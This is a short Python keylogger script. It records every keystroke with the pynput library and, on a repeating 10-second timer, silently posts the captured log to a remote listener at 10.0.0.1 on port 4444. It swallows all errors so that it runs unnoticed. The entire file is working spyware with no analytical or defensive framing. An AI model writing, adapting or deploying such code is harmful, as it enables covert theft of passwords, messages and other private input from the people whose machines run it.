import pynput.keyboard
import threading
import requests

log = ""

def on_press(key):
    global log
    try:
        log += key.char
    except:
        log += f" [{key}] "

def report():
    global log
    if log:
        try:
            requests.post("http://10.0.0.1:4444", data={"log": log})
        except:
            pass
        log = ""
    timer = threading.Timer(10, report)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
keyboard_listener.start()
report()
